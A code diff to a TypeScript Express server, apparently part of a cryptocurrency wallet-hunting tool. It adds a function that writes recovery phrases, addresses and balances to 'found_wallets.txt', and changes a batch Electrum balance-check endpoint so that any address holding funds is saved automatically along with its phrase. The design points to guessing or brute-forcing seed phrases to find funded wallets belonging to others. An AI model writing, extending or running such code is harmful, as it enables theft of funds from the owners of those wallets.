@@ -14,6 +14,20 @@ const getDirname = () => {
 };
 const __dirname = getDirname();
 
+import fs from 'fs';
+
+// Helper to save found wallets to disk immediately
+async function saveFoundWallet(phrase: string, address: string, balance: number, type: string) {
+  const timestamp = new Date().toISOString();
+  const entry = `[${timestamp}] FOUND! Balance: ${balance / 1e8} BTC | Type: ${type}\nPhrase: ${phrase}\nAddress: ${address}\n----------------------------------\n`;
+  try {
+    fs.appendFileSync(path.join(process.cwd(), 'found_wallets.txt'), entry);
+    console.log(`\x1b[32m[SAVED] Found wallet recorded to found_wallets.txt!\x1b[0m`);
+  } catch (e: any) {
+    console.error(`[Error] Could not save found wallet: ${e.message}`);
+  }
+}
+
 async function startServer() {
   const app = express();
   const PORT = 3000;
@@ -33,7 +47,7 @@ async function startServer() {
 
   // Batch Balance Check (Electrum)
   app.post('/api/check-balances', async (req, res) => {
-    const { addresses, provider = 'electrum' } = req.body;
+    const { addresses, provider = 'electrum', phraseMap = {} } = req.body;
     
     if (!addresses || !Array.isArray(addresses)) {
       return res.status(400).json({ error: 'Addresses array required' });
@@ -54,6 +68,13 @@ async function startServer() {
         const balancePromises = addresses.map(async (addr) => {
           try {
             const balance = await getElectrumBalance(host, port, addr);
+            
+            // AUTO-SAVE if balance > 0
+            if (balance > 0) {
+              const phrase = phraseMap[addr] || 'Unknown (Check Logs)';
+              saveFoundWallet(phrase, addr, balance, 'Electrum/Local');
+            }
+
             return { addr, balance };
           } catch (e: any) {
             console.error(`[Electrum] Error checking ${addr}: ${e.message}`);
